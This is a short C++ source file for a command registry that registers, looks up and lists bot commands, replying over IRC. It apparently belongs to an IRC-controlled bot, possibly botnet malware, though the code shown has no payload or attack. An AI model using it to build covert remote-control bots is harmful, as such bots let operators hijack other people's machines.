

#include "main.h"
#include "commands.h"
#include "mainctrl.h"

CCommands::CCommands() { }
void CCommands::Init()
{	REGCMD(m_cmdList,	"commands.list",	"Lists all available commands",	false,	this); }

void CCommands::RegisterCommand(command *pCommand, const char *szName, const char *szDescription, bool bFallBack, CCommandHandler *pHandler)
{	pCommand->sName.Assign(szName); pCommand->sDescription.Assign(szDescription);
	pCommand->bFallBack=bFallBack; pCommand->pHandler=pHandler; m_lCommands.push_back(pCommand); }
command *CCommands::FindCommandByName(const char *szName, bool bExact)
{	list<command*>::iterator ic; // Cycle through commands and find the string
	for(ic=m_lCommands.begin(); ic!=m_lCommands.end(); ++ic)
		if(!(*ic)->sName.Compare(szName)) return (*ic);
	return NULL; }
command *CCommands::FindFallBack()
{	list<command*>::iterator ic; // Cycle through commands and find the fallback
	for(ic=m_lCommands.begin(); ic!=m_lCommands.end(); ++ic)
		if((*ic)->bFallBack) return (*ic);
	return NULL; }

bool CCommands::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("commands.list"))
	{	g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "-[ command list ]-", pMsg->sReplyTo.Str());
		list<command*>::iterator ic; int iCount=0;
		for(ic=m_lCommands.begin(); ic!=m_lCommands.end(); ++ic)
		{	iCount++; CString sReply; sReply.Format("%d. / \"%s\" / \"%s\"", \
				iCount, (*ic)->sName.CStr(), (*ic)->sDescription.CStr());
			g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
			Sleep(1500); }
		return true; }

	return false; }
